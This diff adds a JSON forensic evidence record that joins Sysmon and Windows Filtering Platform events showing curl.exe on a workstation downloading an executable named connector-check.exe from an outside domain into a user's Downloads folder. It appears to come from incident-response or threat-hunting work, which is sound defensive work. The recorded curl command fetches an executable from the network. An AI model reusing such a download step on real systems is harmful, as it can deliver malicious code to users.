@@ -1,0 +1,67 @@
+{
+  "scope": "Positive Windows Sysmon ProcessGuid join across downloader create/file-create/network-connect; native WFP PID evidence retained separately. Only visible downloaded-file actors included; missing records alone are not judged impossible.",
+  "hosts": [
+    {
+      "source": "WS-MCHEN-01.meridianhcs.local/windows_event_sysmon.xml",
+      "source_sha256": "d266dc6c4873987ff9ce6c2338aff8bed191c960ba955a44f2f926d4e76b4bb0",
+      "downloads": [
+        {
+          "pid": "7496",
+          "guid": "{7b2a0e3f-a20f-6ae8-3a02-0010129f24a6}",
+          "command": "curl.exe -fsS -o C:\\Users\\marcus.chen\\Downloads\\connector-check.exe https://support.valeworks-health.net/tools/windows-x64/connector-check.exe",
+          "file_creates": [
+            {
+              "RuleName": "-",
+              "UtcTime": "2026-11-02 14:45:37.956",
+              "ProcessGuid": "{7b2a0e3f-a20f-6ae8-3a02-0010129f24a6}",
+              "ProcessId": "7496",
+              "Image": "C:\\Windows\\System32\\curl.exe",
+              "TargetFilename": "C:\\Users\\marcus.chen\\Downloads\\connector-check.exe",
+              "CreationUtcTime": "2026-11-02 14:45:37.956",
+              "User": "MERIDIANHCS\\marcus.chen"
+            }
+          ],
+          "network_connects": [
+            {
+              "RuleName": "-",
+              "UtcTime": "2026-11-02 14:45:39.225",
+              "ProcessGuid": "{7b2a0e3f-a20f-6ae8-3a02-0010129f24a6}",
+              "ProcessId": "7496",
+              "Image": "C:\\Windows\\System32\\curl.exe",
+              "User": "MERIDIANHCS\\marcus.chen",
+              "Protocol": "tcp",
+              "Initiated": "true",
+              "SourceIsIpv6": "false",
+              "SourceIp": "10.10.1.31",
+              "SourceHostname": "WS-MCHEN-01.meridianhcs.local",
+              "SourcePort": "59785",
+              "SourcePortName": "-",
+              "DestinationIsIpv6": "false",
+              "DestinationIp": "10.10.3.20",
+              "DestinationHostname": "-",
+              "DestinationPort": "8080",
+              "DestinationPortName": "http-alt"
+            }
+          ],
+          "security_5156": [
+            {
+              "ProcessID": "7496",
+              "Application": "\\device\\harddiskvolume7\\windows\\system32\\curl.exe",
+              "Direction": "%%14593",
+              "SourceAddress": "10.10.1.31",
+              "SourcePort": "59785",
+              "DestAddress": "10.10.3.20",
+              "DestPort": "8080",
+              "Protocol": "6",
+              "FilterRTID": "22577",
+              "LayerName": "%%14611",
+              "LayerRTID": "48",
+              "RemoteUserID": "S-1-0-0",
+              "RemoteMachineID": "S-1-0-0"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
